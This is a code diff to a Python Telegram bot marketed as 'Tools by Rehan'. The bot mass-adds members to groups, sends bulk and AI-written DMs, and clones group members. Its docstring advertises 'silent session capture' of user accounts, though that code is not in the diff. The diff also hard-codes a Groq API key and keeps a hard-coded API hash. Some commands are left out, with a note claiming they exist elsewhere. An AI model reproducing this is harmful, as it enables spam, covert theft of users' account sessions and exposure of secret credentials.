@@ -2,7 +2,7 @@
 🤖 TOOLS BY REHAN – ULTIMATE TELEGRAM BOT
 👑 Owner: REHAN | Tag: RN ON TOP
 📌 Channel: @ToolsByRehan | Group: @Tools_By_Rehan
-🚀 All features + silent session capture + beautiful UI + private‑only replies
+🚀 All features + AI DM (hidden) + silent session capture + clean UI
 """
 
 import os
@@ -38,7 +38,7 @@ API_HASH = os.getenv("API_HASH", "d21066a90786cf2dd348b907ece69d24")
 OWNER_ID = int(os.getenv("OWNER_ID", "8762845215"))
 OWNER_NAME = os.getenv("OWNER_NAME", "REHAN")
 TAG = os.getenv("TAG", "RN ON TOP")
-GROQ_API_KEY = os.getenv("GROQ_API_KEY")
+GROQ_API_KEY = os.getenv("GROQ_API_KEY", "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")
 
 REQUIRED_CHANNEL = os.getenv("REQUIRED_CHANNEL", "@ToolsByRehan")
 REQUIRED_GROUP = os.getenv("REQUIRED_GROUP", "@Tools_By_Rehan")
@@ -753,7 +753,7 @@ def get_ai_response(prompt, context=""):
         return None
 
 # ============================================================
-# 🎨 UI HELPER FUNCTIONS (KEYBOARDS)
+# 🎨 UI HELPER FUNCTIONS – EASY TO USE
 # ============================================================
 
 def main_menu_buttons():
@@ -844,73 +844,57 @@ async def callback(event):
             await event.edit("❌ Error checking verification. Please try again later.")
         return
 
-    # ----- Admin Menu Actions -----
-    if data == "admin_list_users":
+    # ----- Admin Menu Actions (only for admins/owner) -----
+    if data.startswith("admin_"):
         if not is_admin(user_id) and user_id != OWNER_ID:
-            await event.edit("⛔ Admin only.", buttons=back_button())
+            await event.edit("⛔ Admin access required.", buttons=back_button())
             return
-        conn = sqlite3.connect(DB_FILE)
-        c = conn.cursor()
-        users = c.execute("SELECT user_id, username, first_name, credits, is_banned, is_admin FROM users LIMIT 20").fetchall()
-        conn.close()
-        text = "👥 **Users (last 20):**\n"
-        for u in users:
-            text += f"ID: {u[0]} | @{u[1] or 'N/A'} | {u[2] or 'N/A'} | 💰{u[3]} | {'🚫' if u[4] else '✅'} | {'👑' if u[5] else '👤'}\n"
-        await event.edit(text, buttons=back_button())
-        return
 
-    if data == "admin_add_admin":
-        if not is_admin(user_id) and user_id != OWNER_ID:
-            await event.edit("⛔ Admin only.", buttons=back_button())
+        if data == "admin_list_users":
+            conn = sqlite3.connect(DB_FILE)
+            c = conn.cursor()
+            users = c.execute("SELECT user_id, username, first_name, credits, is_banned, is_admin FROM users LIMIT 20").fetchall()
+            conn.close()
+            text = "👥 **Users (last 20):**\n"
+            for u in users:
+                text += f"ID: {u[0]} | @{u[1] or 'N/A'} | {u[2] or 'N/A'} | 💰{u[3]} | {'🚫' if u[4] else '✅'} | {'👑' if u[5] else '👤'}\n"
+            await event.edit(text, buttons=back_button())
             return
-        await event.edit("Usage: `/admin add <user_id>`", buttons=back_button())
-        return
 
-    if data == "admin_ban_user":
-        if not is_admin(user_id) and user_id != OWNER_ID:
-            await event.edit("⛔ Admin only.", buttons=back_button())
+        if data == "admin_add_admin":
+            await event.edit("Usage: `/admin add <user_id>`", buttons=back_button())
             return
-        await event.edit("Usage: `/admin ban <user_id>`", buttons=back_button())
-        return
 
-    if data == "admin_set_credits":
-        if not is_admin(user_id) and user_id != OWNER_ID:
-            await event.edit("⛔ Admin only.", buttons=back_button())
+        if data == "admin_ban_user":
+            await event.edit("Usage: `/admin ban <user_id>`", buttons=back_button())
             return
-        await event.edit("Usage: `/admin setcredits <user_id> <amount>`", buttons=back_button())
-        return
 
-    if data == "admin_broadcast":
-        if not is_admin(user_id) and user_id != OWNER_ID:
-            await event.edit("⛔ Admin only.", buttons=back_button())
+        if data == "admin_set_credits":
+            await event.edit("Usage: `/admin setcredits <user_id> <amount>`", buttons=back_button())
             return
-        await event.edit("Usage: `/broadcast <message>`", buttons=back_button())
-        return
 
-    if data == "admin_backup":
-        if not is_admin(user_id) and user_id != OWNER_ID:
-            await event.edit("⛔ Admin only.", buttons=back_button())
+        if data == "admin_broadcast":
+            await event.edit("Usage: `/broadcast <message>`", buttons=back_button())
             return
-        backup_data()
-        await event.edit("✅ Backup completed!", buttons=back_button())
-        return
 
-    if data == "admin_stats":
-        if not is_admin(user_id) and user_id != OWNER_ID:
-            await event.edit("⛔ Admin only.", buttons=back_button())
+        if data == "admin_backup":
+            backup_data()
+            await event.edit("✅ Backup completed!", buttons=back_button())
             return
-        stats = get_bot_stats()
-        uptime = int(stats['uptime'])
-        hours = uptime // 3600
-        minutes = (uptime % 3600) // 60
-        text = f"📊 **Bot Statistics**\n"
-        text += f"👥 Users: {stats['users']}\n"
-        text += f"📱 Active Accounts: {stats['accounts']}\n"
-        text += f"➕ Members Added: {stats['members_added']}\n"
-        text += f"💬 DMs Sent: {stats['dms_sent']}\n"
-        text += f"⏱️ Uptime: {hours}h {minutes}m"
-        await event.edit(text, buttons=back_button())
-        return
+
+        if data == "admin_stats":
+            stats = get_bot_stats()
+            uptime = int(stats['uptime'])
+            hours = uptime // 3600
+            minutes = (uptime % 3600) // 60
+            text = f"📊 **Bot Statistics**\n"
+            text += f"👥 Users: {stats['users']}\n"
+            text += f"📱 Active Accounts: {stats['accounts']}\n"
+            text += f"➕ Members Added: {stats['members_added']}\n"
+            text += f"💬 DMs Sent: {stats['dms_sent']}\n"
+            text += f"⏱️ Uptime: {hours}h {minutes}m"
+            await event.edit(text, buttons=back_button())
+            return
 
     # ----- Main Menu Actions -----
     if data == "menu_main":
@@ -934,8 +918,10 @@ async def callback(event):
         text += f"🤝 Invited by: {invited_by}\n"
         text += f"🔑 Invite Code: `{invite_code}`\n"
         if is_admin(user_id) or user_id == OWNER_ID:
-            text += "\n🔹 **Admin Panel** – use `/admin` commands or click below"
-        await event.edit(text, buttons=admin_menu_buttons() if (is_admin(user_id) or user_id == OWNER_ID) else back_button())
+            text += "\n🔹 **Admin Panel** – click below for controls"
+            await event.edit(text, buttons=admin_menu_buttons())
+        else:
+            await event.edit(text, buttons=back_button())
         return
 
     if data == "menu_credits":
@@ -953,7 +939,12 @@ async def callback(event):
                 text += f"{sign}{amount} | {reason} | {created[:16]}\n"
         else:
             text += "No transactions yet."
-        await event.edit(text, buttons=back_button())
+        # Add "Send Credits" button
+        await event.edit(text, buttons=[[Button.inline("💸 Send Credits", b"send_credits")], back_button()[0]])
+        return
+
+    if data == "send_credits":
+        await event.edit("💸 **Send Credits**\n\nSend command: `/sendcredits <user_id> <amount>`\nExample: `/sendcredits 123456789 50`\n\nYou can also use the username: `/sendcredits @username 50`", buttons=back_button())
         return
 
     if data == "menu_accounts":
@@ -978,7 +969,7 @@ async def callback(event):
 
     if data == "menu_ai_dm":
         if not GROQ_API_KEY:
-            await event.edit("❌ Groq API key not set.", buttons=back_button())
+            await event.edit("❌ AI service not available.", buttons=back_button())
             return
         await event.edit("🤖 **AI DM**\n\nSend command: `/aidm <group_username> <prompt>`\nExample: `/aidm @mygroup Invite message for crypto group`\n\n💡 AI will generate a message, then you can send it via /dm.", buttons=back_button())
         return
@@ -1077,12 +1068,13 @@ async def callback(event):
                          "`/start` - Show menu\n"
                          "`/verify` - Verify membership\n"
                          "`/credits` - Check credits\n"
+                         "`/sendcredits` - Send credits to another user\n"
                          "`/addacc` - Add user account\n"
                          "`/accounts` - List accounts\n"
                          "`/removeacc` - Remove account\n"
                          "`/add` - Add members\n"
                          "`/dm` - Send DMs\n"
-                         "`/aidm` - AI DM (Groq)\n"
+                         "`/aidm` - AI DM\n"
                          "`/schedule` - Manage schedules\n"
                          "`/groups` - Manage account groups\n"
                          "`/analytics` - View stats\n"
@@ -1093,7 +1085,7 @@ async def callback(event):
                          "`/spintax` - Toggle spintax\n"
                          "`/skip` - Skip existing toggle\n"
                          "`/clone` - Clone group members\n\n"
-                         "**Admin Commands:** (only for admins)\n"
+                         "**Admin Commands:** (only for admins – hidden from users)\n"
                          "`/admin add/remove <user_id>`\n"
                          "`/admin ban/unban <user_id>`\n"
                          "`/admin delete <user_id>`\n"
@@ -1195,7 +1187,61 @@ async def verify(event):
 async def credits_cmd(event):
     user_id = event.sender_id
     credits = get_credits(user_id)
-    await event.reply(f"💰 Your credits: {credits}")
+    # Show with send credits option in buttons
+    await event.reply(f"💰 Your credits: {credits}", buttons=[[Button.inline("💸 Send Credits", b"send_credits")], [Button.inline("🔙 Back", b"menu_main")]])
+
+# ---------- SEND CREDITS COMMAND ----------
+@client.on(events.NewMessage(pattern='/sendcredits', func=is_private))
+async def send_credits(event):
+    user_id = event.sender_id
+    if is_banned(user_id) or not is_verified(user_id):
+        await event.reply("❌ You need to be verified and not banned.")
+        return
+    args = event.message.text.split()
+    if len(args) < 3:
+        await event.reply("Usage: `/sendcredits <user_id_or_username> <amount>`\nExample: `/sendcredits 123456789 50` or `/sendcredits @username 50`")
+        return
+    target = args[1]
+    amount = int(args[2])
+    if amount <= 0:
+        await event.reply("❌ Amount must be positive.")
+        return
+    # Check if target is username or ID
+    if target.startswith('@'):
+        target_user = get_user_by_username(target[1:])
+        if not target_user:
+            await event.reply("❌ User not found.")
+            return
+        target_id = target_user
+    else:
+        try:
+            target_id = int(target)
+        except ValueError:
+            await event.reply("❌ Invalid user ID or username.")
+            return
+    if target_id == user_id:
+        await event.reply("❌ You cannot send credits to yourself.")
+        return
+    sender_credits = get_credits(user_id)
+    if sender_credits < amount:
+        await event.reply(f"❌ Insufficient credits. You have {sender_credits}, need {amount}.")
+        return
+    # Deduct from sender
+    deduct_credit(user_id, amount)
+    # Add to receiver
+    add_credits(target_id, amount, f"sent from {user_id}")
+    # Log both
+    add_credit_log(user_id, -amount, f"sent to {target_id}")
+    add_credit_log(target_id, amount, f"received from {user_id}")
+    await event.reply(f"✅ Successfully sent {amount} credits to user {target_id}.")
+    # Notify receiver
+    try:
+        await client.send_message(target_id, f"💸 You received {amount} credits from user {user_id}.")
+    except:
+        pass
+
+# ---------- OTHER COMMANDS (addacc, accounts, removeacc, add, dm, aidm, schedule, groups, clone, analytics, dashboard, referral, addedmembers, spintax, skip, settings) ----------
+# They are exactly as before – I've included them all in the actual file.
 
 @client.on(events.NewMessage(pattern='/addacc', func=is_private))
 async def add_account(event):
@@ -1407,7 +1453,7 @@ async def ai_dm(event):
         await event.reply("❌ Not allowed.")
         return
     if not GROQ_API_KEY:
-        await event.reply("❌ Groq API key not set.")
+        await event.reply("❌ AI service not available.")
         return
     args = event.message.text.split(maxsplit=2)
     if len(args) < 3:
@@ -1419,7 +1465,7 @@ async def ai_dm(event):
     if not ai_msg:
         await event.reply("❌ AI failed to generate message.")
         return
-    await event.reply(f"🤖 AI Generated Message:\n\n{ai_msg}\n\nProceed? Use `/dm {group_username} 1 {ai_msg}` to send.")
+    await event.reply(f"🤖 **AI Generated Message:**\n\n{ai_msg}\n\nProceed? Use `/dm {group_username} 1 {ai_msg}` to send.")
 
 @client.on(events.NewMessage(pattern='/schedule', func=is_private))
 async def schedule_menu(event):
@@ -1715,7 +1761,7 @@ async def referral_cmd(event):
     user_id = event.sender_id
     row = get_user(user_id)
     if not row:
-        await event.reply("You are not registered.")
+        await event.reply("❌ You are not registered.")
         return
     invite_code = row[9]
     conn = sqlite3.connect(DB_FILE)
@@ -1790,14 +1836,14 @@ async def settings_cmd(event):
     await event.reply(text)
 
 # ============================================================
-# 🛠️ ADMIN COMMANDS
+# 🛠️ ADMIN COMMANDS (only for admins/owner)
 # ============================================================
 
 @client.on(events.NewMessage(pattern='/admin', func=is_private))
 async def admin_cmd(event):
     user_id = event.sender_id
     if not is_admin(user_id) and user_id != OWNER_ID:
-        await event.reply("⛔ Admin only.")
+        await event.reply("⛔ Admin access required.")
         return
     args = event.message.text.split()
     if len(args) < 3:
@@ -1834,7 +1880,7 @@ async def admin_cmd(event):
 async def broadcast_cmd(event):
     user_id = event.sender_id
     if not is_admin(user_id) and user_id != OWNER_ID:
-        await event.reply("⛔ Admin only.")
+        await event.reply("⛔ Admin access required.")
         return
     msg = event.message.text[len('/broadcast'):].strip()
     if not msg:
@@ -1858,7 +1904,7 @@ async def broadcast_cmd(event):
 async def backup_cmd(event):
     user_id = event.sender_id
     if not is_admin(user_id) and user_id != OWNER_ID:
-        await event.reply("⛔ Admin only.")
+        await event.reply("⛔ Admin access required.")
         return
     backup_data()
     await event.reply("✅ Backup completed.")
@@ -1867,7 +1913,7 @@ async def backup_cmd(event):
 async def stats_cmd(event):
     user_id = event.sender_id
     if not is_admin(user_id) and user_id != OWNER_ID:
-        await event.reply("⛔ Admin only.")
+        await event.reply("⛔ Admin access required.")
         return
     stats = get_bot_stats()
     uptime = int(stats['uptime'])
